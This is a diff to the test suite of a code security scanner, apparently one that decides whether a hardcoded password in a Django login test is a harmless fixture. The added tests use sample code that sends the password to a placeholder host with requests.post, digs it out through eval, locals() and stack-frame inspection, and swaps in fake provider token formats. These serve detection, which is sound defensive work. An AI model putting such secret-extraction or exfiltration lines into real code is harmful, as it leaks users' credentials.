@@ -929,7 +929,7 @@ from django.contrib.auth.models import User
 class LoginCheck(APITestCase):
     def test_login(self):
         username = "created-user"
-        password = "fixture-credential"
+        password = "fictionalvalue"
         User.objects.create_user(username=username, password=password)
         credentials = f"{username}:{password}"
         encoded = base64.b64encode(credentials.encode(HTTP_HEADER_ENCODING)).decode(HTTP_HEADER_ENCODING)
@@ -973,10 +973,180 @@ def _app133_drf_projection(tmp_path, text, *, corrupt_source=False):
 def test_application133_credential_role_uses_authority_not_filename(tmp_path):
     evidence = _app133_drf_projection(tmp_path, _APP133_DRF)
     assert evidence["eligible"] is True
+    assert evidence["consumer_use_closure"]["complete"] is True
+    assert evidence["consumer_use_closure"]["uses"]
     assert evidence["runtime_assurance"] == "INCOMPLETE"
     assert evidence["transport_role"] == "UNASSESSED"
     assert evidence["target_execution"] == "not_performed"
     assert evidence["witness_sources"]
+
+
+@pytest.mark.parametrize(
+    "extra_use",
+    [
+        '        requests.post("https://example.invalid", headers={"Authorization": password})\n',
+        "        external_password = password\n"
+        '        requests.post("https://example.invalid", headers={"Authorization": external_password})\n',
+        '        leaked = b.eval("password")\n',
+        '        leaked = b.locals()["password"]\n',
+        '        reflect = b.eval\n        leaked = reflect("password")\n',
+        '        from builtins import eval as reflect\n        leaked = reflect("password")\n',
+        '        leaked = b.__dict__["eval"]("password")\n',
+        '        leaked = __builtins__["eval"]("password")\n',
+        '        leaked = b.__dict__["locals"]()["password"]\n',
+        '        namespace = b.__dict__\n        leaked = namespace["locals"]()["password"]\n',
+        '        leaked = b.__dict__.get("eval")("password")\n',
+        '        leaked = b.__dict__.get("locals")()["password"]\n',
+        '        leaked = b.__dict__.copy().get("eval")("password")\n',
+        '        leaked = b.__dict__.get("eval").__call__("password")\n',
+        '        leaked = sys._getframe().f_locals["password"]\n',
+        '        leaked = inspect.currentframe().f_locals["password"]\n',
+        '        leaked = sys._getframe().f_globals.get("password")\n',
+        '        from sys import _getframe as capture\n        leaked = capture().f_locals["password"]\n',
+        '        from inspect import currentframe as capture\n        leaked = capture().f_globals["password"]\n',
+        '        capture = inspect.currentframe\n        leaked = capture().f_locals["password"]\n',
+        '        leaked = inspect.stack()[0].frame.f_locals["password"]\n',
+        '        leaked = next(traceback.walk_stack(None))[0].f_globals["password"]\n',
+    ],
+)
+def test_application133_external_consumer_keeps_secret_unknown(tmp_path, extra_use):
+    text = _APP133_DRF.replace(
+        "import base64\n",
+        "import requests\nimport builtins as b\nimport sys\nimport inspect\nimport traceback\nimport base64\n",
+        1,
+    ).replace(
+        '        response = self.client.post("/session")\n',
+        extra_use + '        response = self.client.post("/session")\n',
+        1,
+    )
+    evidence = _app133_drf_projection(tmp_path, text)
+    assert evidence["eligible"] is False
+
+
+@pytest.mark.parametrize(
+    "token",
+    [
+        "sk_live_aaaaaaaaaaaaaaaa",
+        "AKIA1234567890ABCDEF",
+        "ghp_abcdefghijklmnopqrstuvwxyz0123456789",
+    ],
+)
+def test_application133_known_provider_token_remains_reportable(tmp_path, token):
+    text = _APP133_DRF.replace(
+        'password = "fictionalvalue"',
+        f'password = "{token}"',
+        1,
+    )
+    evidence = _app133_drf_projection(tmp_path, text)
+    assert evidence["eligible"] is False
+
+
+@pytest.mark.parametrize("literal", ["password", "fixture-credential", "test123"])
+def test_application133_dummy_fixture_words_are_not_known_token_formats(
+    tmp_path, literal
+):
+    text = _APP133_DRF.replace(
+        'password = "fictionalvalue"', f'password = "{literal}"', 1
+    )
+    evidence = _app133_drf_projection(tmp_path, text)
+    assert evidence["eligible"] is True
+
+
+def test_application133_external_use_change_invalidates_warm_projection(tmp_path):
+    path = tmp_path / "checks" / "login.py"
+    path.parent.mkdir(parents=True)
+    path.write_text(_APP133_DRF, encoding="utf-8")
+    first = security_scan(tmp_path, cache_enabled=True)
+    assert any(
+        row["facts"].get("disposition") == "TEST_OWNED_APPLICATION_CREDENTIAL"
+        for row in first.get("primitive_observations", [])
+    )
+    path.write_text(
+        _APP133_DRF.replace(
+            "import base64\n", "import requests\nimport base64\n", 1
+        ).replace(
+            '        response = self.client.post("/session")\n',
+            '        requests.post("https://example.invalid", headers={"Authorization": password})\n'
+            '        response = self.client.post("/session")\n',
+            1,
+        ),
+        encoding="utf-8",
+    )
+    second = security_scan(tmp_path, cache_enabled=True)
+    assert not any(
+        row["facts"].get("disposition") == "TEST_OWNED_APPLICATION_CREDENTIAL"
+        for row in second.get("primitive_observations", [])
+    )
+    assert any(
+        row["code"] == "SECURITY_HARDCODED_SECRET" and row["severity"] == "CRITICAL"
+        for row in second["findings"]
+    )
+
+
+def test_application_known_token_inventory_code_change_invalidates_cache(
+    tmp_path, monkeypatch
+):
+    from factoryline import intent_quality
+
+    path = tmp_path / "checks" / "login.py"
+    path.parent.mkdir(parents=True)
+    token_source = _APP133_DRF.replace(
+        'password = "fictionalvalue"',
+        'password = "sk_live_aaaaaaaaaaaaaaaa"',
+        1,
+    )
+    path.write_text(token_source, encoding="utf-8")
+    first = security_scan(tmp_path, cache_enabled=True)
+    assert not any(
+        row["facts"].get("disposition") == "TEST_OWNED_APPLICATION_CREDENTIAL"
+        for row in first.get("primitive_observations", [])
+    )
+
+    def accept_token(_value):
+        return False
+
+    monkeypatch.setattr(
+        intent_quality._looks_like_known_credential,
+        "__code__",
+        accept_token.__code__,
+    )
+    second = security_scan(tmp_path, cache_enabled=True)
+    assert any(
+        row["facts"].get("disposition") == "TEST_OWNED_APPLICATION_CREDENTIAL"
+        for row in second.get("primitive_observations", [])
+    )
+
+
+def test_application_secret_pattern_inventory_rebinding_invalidates_warm_cache(
+    tmp_path, monkeypatch
+):
+    import re
+    from factoryline import context_efficiency
+
+    path = tmp_path / "checks" / "login.py"
+    path.parent.mkdir(parents=True)
+    path.write_text(_APP133_DRF, encoding="utf-8")
+    first = security_scan(tmp_path, cache_enabled=True)
+    assert any(
+        row["facts"].get("disposition") == "TEST_OWNED_APPLICATION_CREDENTIAL"
+        for row in first.get("primitive_observations", [])
+    )
+    monkeypatch.setattr(
+        context_efficiency,
+        "_SECRET_BYTES",
+        (*context_efficiency._SECRET_BYTES, re.compile(b"fictionalvalue")),
+    )
+    warm = security_scan(tmp_path, cache_enabled=True)
+    cold = security_scan(tmp_path, cache_enabled=False)
+    for report in (warm, cold):
+        assert not any(
+            row["facts"].get("disposition") == "TEST_OWNED_APPLICATION_CREDENTIAL"
+            for row in report.get("primitive_observations", [])
+        )
+        assert any(
+            row["code"] == "SECURITY_HARDCODED_SECRET" and row["severity"] == "CRITICAL"
+            for row in report["findings"]
+        )
 
 
 @pytest.mark.parametrize(
@@ -1069,6 +1239,12 @@ def test_application_provider_workspace_replacement_rejects_profile(tmp_path, pr
         "claimed-isolation",
         "claimed-runtime",
         "declaration-mismatch",
+        "invalid-closure-role",
+        "forged-use-name",
+        "forged-outside-witness",
+        "duplicate-use-span",
+        "orphan-assignment",
+        "missing-credential-use",
     ],
 )
 def test_application_binding_rejects_rehashed_incomplete_assurance(tmp_path, mutation):
@@ -1087,7 +1263,8 @@ def test_application_binding_rejects_rehashed_incomplete_assurance(tmp_path, mut
     )
     binding = {"checks/login.py": hashlib.sha256(path.read_bytes()).hexdigest()}
     sources = [{"path": key, "sha256": digest} for key, digest in binding.items()]
-    assert application_fixture_binding(finding, sources, binding)
+    source_bytes = {"checks/login.py": path.read_bytes()}
+    assert application_fixture_binding(finding, sources, binding, source_bytes)
     altered = copy.deepcopy(finding)
     facts = altered["facts"]
     evidence = facts["fixture_evidence"]
@@ -1098,6 +1275,40 @@ def test_application_binding_rejects_rehashed_incomplete_assurance(tmp_path, mut
         evidence["profile"] = "UNREVIEWED_PROFILE"
     elif mutation == "declaration-mismatch":
         evidence["declaration_span"][0] += 1
+    elif mutation == "invalid-closure-role":
+        evidence["consumer_use_closure"]["uses"][0]["role"] = "external_sink"
+    elif mutation == "forged-use-name":
+        evidence["consumer_use_closure"]["uses"][0]["name"] = "not_a_real_load"
+    elif mutation == "forged-outside-witness":
+        evidence["consumer_use_closure"]["uses"].append(
+            {
+                "path": "checks/login.py",
+                "sha256": binding["checks/login.py"],
+                "span": [1, 0, 1, 1],
+                "name": "password",
+                "role": "header",
+            }
+        )
+    elif mutation == "duplicate-use-span":
+        evidence["consumer_use_closure"]["uses"][-1]["span"] = list(
+            evidence["consumer_use_closure"]["uses"][0]["span"]
+        )
+    elif mutation == "orphan-assignment":
+        evidence["consumer_use_closure"]["assignments"].append(
+            {
+                "path": "checks/login.py",
+                "sha256": binding["checks/login.py"],
+                "span": [8, 0, 8, 1],
+                "name": "orphan_alias",
+                "role": "credential_lineage_assignment",
+            }
+        )
+    elif mutation == "missing-credential-use":
+        evidence["consumer_use_closure"]["uses"] = [
+            row
+            for row in evidence["consumer_use_closure"]["uses"]
+            if row["name"] != "password"
+        ]
     else:
         field, value = {
             "executed-target": ("target_execution", "performed"),
@@ -1112,7 +1323,7 @@ def test_application_binding_rejects_rehashed_incomplete_assurance(tmp_path, mut
     facts["proof_facts_sha256"] = hashlib.sha256(
         json.dumps(unsigned, sort_keys=True, separators=(",", ":")).encode()
     ).hexdigest()
-    assert application_fixture_binding(altered, sources, binding) is False
+    assert application_fixture_binding(altered, sources, binding, source_bytes) is False
 
 
 @pytest.mark.parametrize(
@@ -1120,6 +1331,7 @@ def test_application_binding_rejects_rehashed_incomplete_assurance(tmp_path, mut
     [
         "annotate_application_fixture",
         "application_fixture_binding",
+        "_application_use_closure_binding",
         "_application_witness_bindings",
         "_application_assurance_binding",
     ],
